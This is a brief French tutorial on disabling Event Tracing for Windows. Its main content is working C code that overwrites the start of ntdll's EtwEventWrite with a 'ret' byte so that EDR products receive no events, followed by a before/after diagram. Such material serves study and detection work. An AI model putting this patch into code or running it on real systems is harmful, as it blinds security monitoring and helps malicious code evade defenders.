# Cours : ETW Patching - Désactiver Event Tracing Windows

## 1. Introduction

**ETW** (Event Tracing for Windows) = Système de logging de Windows utilisé par les EDR.

## 2. Bypass ETW

```c
// Patcher EtwEventWrite pour qu'il ne fasse rien

HMODULE ntdll = GetModuleHandleA("ntdll.dll");
LPVOID etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

// Écrire "ret" (0xC3) au début de la fonction
DWORD oldProtect;
VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(BYTE*)etwEventWrite = 0xC3;  // ret
VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
```

```ascii
AVANT Patch :
EtwEventWrite:
0x77001234: mov edi, edi
0x77001236: push ebp
...

APRÈS Patch :
EtwEventWrite:
0x77001234: ret  (0xC3)  ← Retourne immédiatement
...

ETW ne log plus rien !
```

## Ressources

- [ETW Bypass](https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/)

